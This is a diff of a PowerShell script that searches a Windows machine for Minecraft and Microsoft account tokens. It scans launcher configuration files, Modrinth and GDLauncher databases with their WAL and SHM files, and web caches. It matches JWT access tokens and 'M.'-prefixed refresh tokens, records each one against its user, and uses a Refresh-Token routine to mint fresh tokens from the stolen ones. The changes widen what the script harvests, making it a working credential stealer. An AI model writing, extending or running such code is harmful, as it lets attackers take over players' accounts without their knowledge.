@@ -13,16 +13,16 @@ $found = @()
 $seen = @{}
 
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
+$msaRegex = "M\.[A-Za-z0-9_\-\.~]{100,}"
 
 function Add-Token {
     param($tok, $user, $src, $type)
     if(-not $tok){ return }
     if($tok.Length -lt 80){ return }
-    if(-not $tok.StartsWith("eyJ")){ return }
+    if(-not ($tok.StartsWith("eyJ") -or $tok.StartsWith("M."))){ return }
     $key = "$type|$tok"
     if($seen.ContainsKey($key)){ return }
     $seen[$key] = $true
-
     $short = $type -replace "Token",""
     $script:found += @"
 [$short] $user
@@ -34,14 +34,20 @@ function Add-Token {
 function Scan-Text {
     param($text, $src, $user)
     if(-not $text){ return }
-    [regex]::Matches($text, $jwtRegex) | %{
-        $val = $_.Value
-        # skip encrypted JWE wrappers, they aint usable
-        if($val.StartsWith("eyJhbGciOiJSU0EtT0FFUC")){ return }
-        # access tokens contain the minecraft client id + xuid pattern
-        if($val -match "eE1pY3Jvc29mdA|MBI_SSL|XboxLive"){ Add-Token $val $user $src "accessToken" }
-        elseif($val -match "refresh"){ Add-Token $val $user $src "refreshToken" }
-        else{ Add-Token $val $user $src "token" }
+
+    $ms = [regex]::Matches($text, $jwtRegex)
+    foreach($m in $ms){
+        $val = [string]$m.Value
+        if([string]::IsNullOrEmpty($val)){ continue }
+        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
+        Add-Token $val $user $src "accessToken"
+    }
+
+    $mr = [regex]::Matches($text, $msaRegex)
+    foreach($m in $mr){
+        $val = [string]$m.Value
+        if([string]::IsNullOrEmpty($val)){ continue }
+        Add-Token $val $user $src "refreshToken"
     }
 }
 
@@ -166,10 +172,11 @@ $includeNames = @(
 foreach($r in $roots){
     if(-not (Test-Path $r)){ continue }
     try{
-        Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0 | %{
-            if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
-            if($_.Length -gt 1mb){ return }
-            Scan-File $_.FullName "unknown"
+        $files = Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0
+        foreach($f in $files){
+            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
+            if($f.Length -gt 1mb){ continue }
+            Scan-File $f.FullName "unknown"
         }
     }catch{}
 }
@@ -184,9 +191,10 @@ $profileRoots = @(
 foreach($pr in $profileRoots){
     if(-not (Test-Path $pr)){ continue }
     try{
-        Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
-            if($_.Length -gt 1mb){ return }
-            Scan-File $_.FullName "unknown"
+        $files = Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0
+        foreach($f in $files){
+            if($f.Length -gt 1mb){ continue }
+            Scan-File $f.FullName "unknown"
         }
     }catch{}
 }
@@ -196,12 +204,14 @@ $modrinthRoot = "$env:APPDATA\ModrinthApp"
 if(Test-Path $modrinthRoot){
     $profilesDir = "$modrinthRoot\profiles"
     if(Test-Path $profilesDir){
-        Get-ChildItem $profilesDir -Directory -EA 0 | %{
-            $cfg = Join-Path $_.FullName "config"
-            if(-not (Test-Path $cfg)){ return }
-            Get-ChildItem $cfg -Recurse -File -Include "minecraft_auth.json","accounts.json","opsec-accounts.json","*.auth.json" -EA 0 | %{
-                if($_.Length -gt 1mb){ return }
-                Scan-File $_.FullName "unknown"
+        $dirs = Get-ChildItem $profilesDir -Directory -EA 0
+        foreach($d in $dirs){
+            $cfg = Join-Path $d.FullName "config"
+            if(-not (Test-Path $cfg)){ continue }
+            $files = Get-ChildItem $cfg -Recurse -File -Include "minecraft_auth.json","accounts.json","opsec-accounts.json","*.auth.json" -EA 0
+            foreach($f in $files){
+                if($f.Length -gt 1mb){ continue }
+                Scan-File $f.FullName "unknown"
             }
         }
     }
@@ -210,7 +220,10 @@ if(Test-Path $modrinthRoot){
 # ---------- 4c. sqlite db scans ----------
 $dbs = @(
     "$env:APPDATA\ModrinthApp\app.db",
+    "$env:APPDATA\ModrinthApp\app.db-wal",
+    "$env:APPDATA\ModrinthApp\app.db-shm",
     "$env:APPDATA\gdlauncher\gdl_conf.db",
+    "$env:APPDATA\gdlauncher\gdl_conf.db-wal",
     "$env:APPDATA\gdlauncher-carbon\gdl_conf.db",
     "$env:APPDATA\.gdlauncher\gdl_conf.db",
     "$env:APPDATA\Gml-Launcher\launcher.db"
@@ -239,7 +252,7 @@ foreach($lc in $webcaches){
     }catch{}
 }
 
-# ---------- 6. refresh tokens ----------
+# ---------- 6. refresh ----------
 function Refresh-Token {
     param($refreshTok)
     try{
@@ -263,7 +276,7 @@ foreach($line in $found){
         $new = Refresh-Token $rt
         if($new){
             $refreshed += @"
-[refreshed] from old refresh
+[refreshed] fresh tokens
   new access:  $($new.access)
   new refresh: $($new.refresh)
 "@
